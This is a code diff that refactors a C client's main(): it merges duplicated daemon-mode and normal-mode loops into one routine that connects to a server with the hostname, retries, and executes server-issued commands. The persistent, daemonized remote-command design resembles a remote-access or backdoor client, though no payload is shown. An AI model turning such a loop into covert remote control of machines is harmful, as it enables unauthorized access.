@@ -172,64 +172,35 @@ int main(int argc, char** argv) {
 	
 	if (daemon){
 		printf("[i] Started in daemon mode.\n");
-		
 		skeleton_daemon();
-		
-		connection_d:
-		socket_val = sock = server_connect(port, addr, hostname);
-		
-		if(sock <= 0) {
-			// If too much tries, go to error
-			if(i++ > MAX_TRY)
-			goto error;
-			
-			// Wait and retry
-			puts("[x] Connection failed, trying again in 5s ...");
-			sleep(5);
-			goto connection_d;
-		}
-		
-		puts("[i] Connected to server !");
-		i = 0; // Reset try counter
-		
-		// Read commands
-		if(server_handler(sock) == 0) {
-			puts("[i] The server closed the connection");
-			daemon = 0;
-			return EXIT_SUCCESS;
-		} else {
-			puts("[x] Connection lost with the server");
-			daemon = 0;			
-			goto connection;
-		}			
 	} else {
 		printf("[i] Computer name : %s\n", hostname);
-		
-		connection:
-		socket_val = sock = server_connect(port, addr, hostname);
-		
-		if(sock <= 0) {
-			// If too much tries, go to error
-			if(i++ > MAX_TRY)
-				goto error;
-				
-			// Wait and retry
-			puts("[x] Connection failed, trying again in 5s ...");
-			sleep(5);
-			goto connection;
-		}
-		
-		puts("[i] Connected to server !");
-		i = 0; // Reset try counter
-		
-		// Read commands
-		if(server_handler(sock) == 0) {
-			puts("[i] The server closed the connection");
-			return EXIT_SUCCESS;
-		} else {
-			puts("[x] Connection lost with the server");			
-			goto connection;
-		}
+	}
+	
+	connection:
+	socket_val = sock = server_connect(port, addr, hostname);
+	
+	if(sock <= 0) {
+		// If too much tries, go to error
+		if(i++ > MAX_TRY)
+			goto error;
+			
+		// Wait and retry
+		puts("[x] Connection failed, trying again in 5s ...");
+		sleep(5);
+		goto connection;
+	}
+	
+	puts("[i] Connected to server !");
+	i = 0; // Reset try counter
+	
+	// Read commands
+	if(server_handler(sock) == 0) {
+		puts("[i] The server closed the connection");
+		return EXIT_SUCCESS;
+	} else {
+		puts("[x] Connection lost with the server");			
+		goto connection;
 	}
 	
 	error:
